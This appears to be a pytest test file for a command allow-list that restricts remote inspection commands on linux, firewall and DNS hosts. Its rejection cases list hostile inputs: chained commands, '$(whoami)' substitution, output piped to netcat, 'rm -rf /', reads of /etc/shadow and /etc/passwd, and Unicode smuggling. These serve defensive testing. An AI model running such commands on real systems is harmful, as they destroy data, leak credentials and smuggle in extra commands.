from pathlib import Path

import pytest

from lights_out.policy import Allow, Deny, Policy, PolicyError

REPO = Path(__file__).resolve().parent.parent


@pytest.fixture
def policy() -> Policy:
    return Policy.from_dict(
        {
            "roles": {
                "linux": {
                    "programs": {
                        "ip": {"forms": [["addr|route", "show"]]},
                        "ping": {"forms": [["-c", "[1-5]", "[a-z0-9.-]+"]]},
                        "uptime": {"forms": [[]]},
                    }
                }
            }
        }
    )


def test_allows_matching_form(policy: Policy) -> None:
    assert policy.check("linux", "ip addr show") == Allow(("ip", "addr", "show"))


def test_allows_program_with_no_arguments(policy: Policy) -> None:
    assert policy.check("linux", "uptime") == Allow(("uptime",))


def test_collapses_whitespace_into_argv(policy: Policy) -> None:
    assert policy.check("linux", "  ip   route show ") == Allow(("ip", "route", "show"))


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        ("", "empty command"),
        ("   ", "empty command"),
        ("ip addr show; reboot", "forbidden character: ;"),
        ("ip addr show | nc 10.20.0.9 9", "forbidden character: |"),
        ("ip addr show > /tmp/x", "forbidden character: >"),
        ("ip addr show && reboot", "forbidden character: &"),
        ("ping -c 1 $(whoami)", "forbidden character: $"),
        ("ping -c 1 `id`", "forbidden character: `"),
        ("ip addr 'show'", "forbidden character: '"),
        ('ip addr "show"', 'forbidden character: "'),
        ("ip addr sh\\ow", "forbidden character: \\"),
        ("ip addr sho*", "forbidden character: *"),
        ("FOO=1 ip addr show", "forbidden character: ="),
        ("ip addr\tshow", "non-printable or non-ASCII character"),
        ("ip addr\nshow", "non-printable or non-ASCII character"),
        ("ip addr show\x00", "non-printable or non-ASCII character"),
        ("ip addr show", "non-printable or non-ASCII character"),
        ("ip addr sh​ow", "non-printable or non-ASCII character"),
        ("іp addr show", "non-printable or non-ASCII character"),
        ("cat ../../etc/shadow", "path traversal"),
        ("rm -rf /", "program not allowed: rm"),
        ("/sbin/ip addr show", "program not allowed: /sbin/ip"),
        ("IP addr show", "program not allowed: IP"),
        ("ip link set eth0 down", "arguments not allowed for ip"),
        ("ip addr", "arguments not allowed for ip"),
        ("ip addr show extra", "arguments not allowed for ip"),
        ("ping -c 9 host.example", "arguments not allowed for ping"),
        ("uptime -s", "arguments not allowed for uptime"),
        ("a" * 513, "command too long"),
    ],
)
def test_denies(policy: Policy, command: str, reason: str) -> None:
    assert policy.check("linux", command) == Deny(reason)


def test_length_limit_is_inclusive(policy: Policy) -> None:
    command = "ip addr show" + " " * (512 - len("ip addr show"))
    assert policy.check("linux", command) == Allow(("ip", "addr", "show"))


def test_patterns_match_the_whole_argument(policy: Policy) -> None:
    assert policy.check("linux", "ip addresses show") == Deny("arguments not allowed for ip")


def test_unknown_role(policy: Policy) -> None:
    assert policy.check("windows", "ip addr show") == Deny("unknown role: windows")


def test_roles(policy: Policy) -> None:
    assert policy.roles() == frozenset({"linux"})


@pytest.mark.parametrize(
    "data",
    [
        {},
        {"roles": {}},
        {"roles": {"r": {}}},
        {"roles": {"r": {"programs": {}}}},
        {"roles": {"r": {"programs": {"ip": {}}}}},
        {"roles": {"r": {"programs": {"ip": {"forms": []}}}}},
        {"roles": {"r": {"programs": {"ip": {"forms": [["("]]}}}}},
        {"roles": {"r": {"programs": {"ip": {"forms": [[1]]}}}}},
        {"roles": {"r": {"programs": {"ip": {"forms": ["addr"]}}}}},
        {"roles": {"r": {"programs": {"/bin/ip": {"forms": [[]]}}}}},
        {"roles": {"r": {"programs": {"ip": {"forms": [[]], "form": [[]]}}}}},
    ],
)
def test_malformed_policy_is_a_load_error(data: dict[str, object]) -> None:
    with pytest.raises(PolicyError):
        Policy.from_dict(data)


def test_default_policy_loads_and_has_three_roles() -> None:
    policy = Policy.from_toml(REPO / "policies" / "default.toml")
    assert policy.roles() == frozenset({"linux", "firewall", "dns"})


@pytest.mark.parametrize(
    ("role", "command", "argv"),
    [
        ("linux", "ip addr show", ("ip", "addr", "show")),
        ("linux", "ping -c 3 gw.lan", ("ping", "-c", "3", "gw.lan")),
        ("linux", "cat /etc/resolv.conf", ("cat", "/etc/resolv.conf")),
        ("linux", "dig printer.lan @10.20.0.1", ("dig", "printer.lan", "@10.20.0.1")),
        (
            "linux",
            "journalctl --no-pager -n 200 -u unbound.service",
            ("journalctl", "--no-pager", "-n", "200", "-u", "unbound.service"),
        ),
        ("firewall", "pfctl -s rules", ("pfctl", "-s", "rules")),
        ("firewall", "cat /var/unbound/unbound.conf", ("cat", "/var/unbound/unbound.conf")),
        ("dns", "systemctl status adguardhome", ("systemctl", "status", "adguardhome")),
    ],
)
def test_default_policy_allows_inspection(role: str, command: str, argv: tuple[str, ...]) -> None:
    policy = Policy.from_toml(REPO / "policies" / "default.toml")
    assert policy.check(role, command) == Allow(argv)


@pytest.mark.parametrize(
    ("role", "command"),
    [
        ("linux", "systemctl restart unbound"),
        ("linux", "systemctl stop unbound"),
        ("linux", "cat /etc/shadow"),
        ("linux", "journalctl -f"),
        ("linux", "journalctl --no-pager -n 5000 -u unbound"),
        ("linux", "ip link set eth0 down"),
        ("linux", "ip route add default via 10.20.0.1"),
        ("linux", "ping -f gw.lan"),
        ("linux", "ping gw.lan"),
        ("linux", "reboot"),
        ("linux", "ping -c 1 -f"),
        ("linux", "dig -f /etc/passwd"),
        ("linux", "dig printer.lan @-x"),
        ("linux", "systemctl status --no-block"),
        ("linux", "nslookup -type any"),
        ("firewall", "pfctl -d"),
        ("firewall", "pfctl -F all"),
        ("firewall", "pfctl -f /etc/pf.conf"),
        ("firewall", "configctl unbound restart"),
        ("firewall", "ifconfig vtnet0 down"),
        ("firewall", "cat /conf/config.xml"),
        ("dns", "systemctl stop adguardhome"),
        ("dns", "cat /etc/shadow"),
    ],
)
def test_default_policy_denies_changes_and_secrets(role: str, command: str) -> None:
    policy = Policy.from_toml(REPO / "policies" / "default.toml")
    assert isinstance(policy.check(role, command), Deny)
